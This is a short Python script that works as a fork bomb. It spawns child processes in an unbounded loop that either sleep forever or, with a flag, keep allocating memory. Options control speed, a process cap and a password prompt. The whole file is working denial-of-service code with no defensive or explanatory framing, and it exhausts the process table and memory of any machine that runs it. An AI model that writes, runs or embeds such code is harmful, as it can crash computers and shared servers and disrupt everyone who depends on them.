import os
import time
import argparse
import sys
import getpass
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def consume_memory():
    data = []
    try:
        while True:
            data.append(' ' * 10**6)
            time.sleep(0.05)
    except:
        pass

def fork_bomb(delay, max_proc, mem_bomb):
    p = 0
    while True:
        if max_proc and p >= max_proc:
            break
        try:
            pid = os.fork()
            if pid == 0:
                if mem_bomb:
                    consume_memory()
                else:
                    while True:
                        time.sleep(1)
            else:
                p += 1
                if delay:
                    time.sleep(delay)
        except:
            break

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["fast", "slow"], default="slow")
    parser.add_argument("--max", type=int)
    parser.add_argument("--delay", type=float)
    parser.add_argument("--password")
    parser.add_argument("--mem", action="store_true")
    args = parser.parse_args()

    if args.password:
        if getpass.getpass() != args.password:
            sys.exit()

    time.sleep(1)
    d = 0 if args.mode == "fast" else (args.delay if args.delay else 0.2)
    fork_bomb(d, args.max, args.mem)

if __name__ == "__main__":
    main()
